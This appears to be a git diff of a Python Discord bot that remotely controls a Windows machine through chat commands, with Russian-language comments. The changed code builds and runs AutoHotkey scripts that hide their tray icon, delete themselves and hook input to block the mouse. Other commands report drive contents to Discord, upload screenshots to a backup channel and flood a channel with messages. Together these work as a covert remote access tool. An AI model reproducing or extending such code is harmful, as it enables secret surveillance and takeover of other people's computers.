@@ -31,6 +31,8 @@ except BaseException:
     print("Не импортировалась библиотеку скринов")
     screen_module_exist = False
 
+from id import ID
+
 ALL_COMMANDS = ["!ahk",
                 "!display",
                 "!mouse",
@@ -88,24 +90,6 @@ def default_settings():
     access_to_screen = True  # Разрешение на скрины
     screen_delay = 100  # delay of pause
     lost_screen_delay = screen_delay
-
-
-class ID:
-    if login == "ALEX":
-        bot = "492816399559819264"
-    else:
-        bot = "492655460084744203"
-
-    print(bot)
-    my_id = '285097296817946625'
-
-    my_guild = '334646051698900992'
-    main = '516691231053709312'
-    main_alex = '565179366632456192'
-    index_online = "531231343309488139"
-    back_up = '514105658958675991'
-    buffer = '521825625028427776'
-    musical = "420965533526130708"
 
 
 class Discord:
@@ -278,7 +262,7 @@ class Discord:
 
     @staticmethod
     def if_command(command, blank):
-        if command == blank or command.startswith(blank + " "):
+        if command == blank or command.startswith(blank):
             return True
         return False
 
@@ -748,8 +732,18 @@ class Scripts:
 
         if File.exist(script_name):
             delete(script_name)
-        include_code1 = "#NoTrayIcon\n#SingleInstance, Force\nFileDelete, %A_ScriptName%\nDetectHiddenWindows, on\n"
-        include_code2 = """
+        include_code = f"""
+            #NoTrayIcon
+            #SingleInstance, Force
+            FileDelete, %A_ScriptName%
+            DetectHiddenWindows, on
+            try {s1}
+                {script}
+            {s2}
+            catch e {s1}
+                ExitApp
+            {s2}
+        
             BlockMouse()
             {s1}
                 return DllCall("SetWindowsHookEx"
@@ -780,10 +774,11 @@ class Scripts:
             {s1}
                Return 1
             {s2}
-                """.format(s1=s1, s2=s2)
+            """
         try:
-            File.write(include_code1 + script + include_code2, script_name)
+            File.write(include_code, script_name)
             start(script_name)
+
         except BaseException:
             await Discord.send_embed(description="Ошибка создания скрипта.")
         else:
@@ -926,7 +921,7 @@ class Scripts:
                         pass
 
         for i in drives_existings:
-            await client.send_message(Channel.main(), i + " " + str(len(os.listdir(i))) + " files")
+            await Channel.main().send(i + " " + str(len(os.listdir(i))) + " files")
 
     @staticmethod
     async def f(message):
@@ -1052,6 +1047,7 @@ class Scripts:
     async def create_ahk(message):
         # settings = Scripts.get_settings(message.content)
         script = Discord.get_script(message.content)
+        print(script)
         await Scripts.ahk(script, "script.ahk")
 
     @staticmethod
@@ -1250,7 +1246,7 @@ async def on_ready():
             body_time = datetime.strftime(datetime.now(), "```python\n\'%d %B %H:%M:%S\'\n```\n")
             url_back_up = await client.send_file(Channel.back_up(), file_name, filename=file_name, content=body_time)
             link = url_back_up.attachments[0]["url"]
-            await client.send_message(Channel.back_up(), link)
+            await Channel.back_up().send(link)
             # access_to_screen = False
         except BaseException:
             pass
@@ -1272,7 +1268,7 @@ async def on_message(message):
     if await Discord.secret_key(message) or await Discord.check_secret_key(message):
         return
 
-    if message.author.id == ID.bot or RUN_STATUS is False:
+    if message.author.id == client.user.id or RUN_STATUS is False:
         return
 
     """
@@ -1285,12 +1281,13 @@ async def on_message(message):
     print(datetime.utcnow() - message.timestamp)
     """
 
-    if message.author.id == ID.bot and message.channel.id != ID.index_online:
+    if message.author.bot and message.channel.id != ID.index_online:
         if INDEX_STATUS:
             return
         INDEX_STATUS = True
         if await Discord.index_online():
             MAIN_SCRIPT = True
+        return
 
     # SCRIPT GUARD ME
     if command.startswith("!") and login == "ALEX":
@@ -1298,16 +1295,15 @@ async def on_message(message):
             await Discord.send_embed(description="Closed.", status=False)
             return
 
-    if command.startswith("!"):
-        if command.count("!") >= 2:
-            return
+    if command.startswith("!") and command.count("!") >= 2:
+        return
 
     if command == "!flood":
         for i in range(100):
             await Discord.send_embed(status=False)
 
     if command == "!quit" or command == "!exit":
-        await client.send_message(Channel.main(), "Okey :ok_hand:")
+        await Channel.main().send("Okey :ok_hand:")
         await client.delete_message(msg_status_of_users)
         quit()
 
@@ -1328,7 +1324,7 @@ async def on_message(message):
     elif CONNECTED_STATUS:
         await Scripts.send_message(message)
 
-    elif command == "!?" and (MAIN_SCRIPT or users_online == 1):
+    elif (command == "!?" or command == "!help") and (MAIN_SCRIPT or users_online == 1):
         await Scripts.help()
 
     elif command == "!cls":
@@ -1399,6 +1395,7 @@ async def on_message(message):
         await Scripts.key(message)
 
     elif Discord.if_command(command, "!ahk"):
+        print("!ahk")
         await Scripts.create_ahk(message)
 
     elif Discord.if_command(command, "!mouse"):
